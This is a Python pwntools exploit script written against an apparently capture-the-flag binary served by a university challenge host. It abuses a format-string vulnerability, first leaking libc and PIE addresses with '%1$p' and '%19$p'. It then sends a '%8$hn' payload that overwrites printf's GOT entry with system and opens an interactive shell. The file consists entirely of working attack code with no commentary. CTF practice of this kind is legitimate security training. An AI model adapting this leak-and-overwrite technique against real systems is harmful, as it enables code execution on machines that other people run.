from pwn import * 

p = process("./bin", env={"LD_PRELOAD": "./libc.so.6"})
# p = gdb.debug(
#     "./bin",
#     """
#     break main
#     continue
#     """,
#     env={"LD_PRELOAD": "./libc.so.6"}
#     )
# p = remote('cyberchallenge.disi.unitn.it', 50231)

def little_to_big_endian(hex_str):
    hex_pairs = [hex_str[i:i+2] for i in range(0, len(hex_str), 2)]
    hex_pairs.reverse()
    big_endian_str = ''.join(hex_pairs)
    return big_endian_str

elf = ELF("./bin")
libc = ELF("./libc.so.6")
context.binary = elf

printf_offset = libc.symbols["printf"]

p.sendlineafter(b'> ', b'%1$p')
libc_leak = p.recvuntil(b'> ').decode().split('\n')[0]
print(libc_leak + " libc leak")
libc_base = int(libc_leak, 16) - (0x7b25d55feb43 - 0x7b25d5400000) 
print(hex(libc_base)+ " libc base")
libc.address = libc_base

p.sendline(b'%19$p')
rbp_leak = p.recvuntil(b'> ').decode().split('\n')[0]
print(rbp_leak + " rbp leak")
pie_base = int(rbp_leak, 16) - 0x0000000000001159
print(hex(pie_base) + " pie base")
elf.address = pie_base
printf_got_address = elf.got['printf']
printf_address = libc.symbols["printf"]
system_address = hex(libc.symbols["system"])

system_pairs = [system_address[i:i+2] for i in range(0, len(system_address), 2)]
last_two_bytes_system = int(''.join(system_pairs[-2:]), 16)
print(last_two_bytes_system)

padding = 8 - ((7 + len(str(last_two_bytes_system))) % 8)
padding_payload = f'%{last_two_bytes_system}X%8$hn{'A'*padding}'.encode()
print(padding_payload, len(padding_payload))
payload = padding_payload + p64(printf_got_address)
p.sendline(payload)
p.interactive()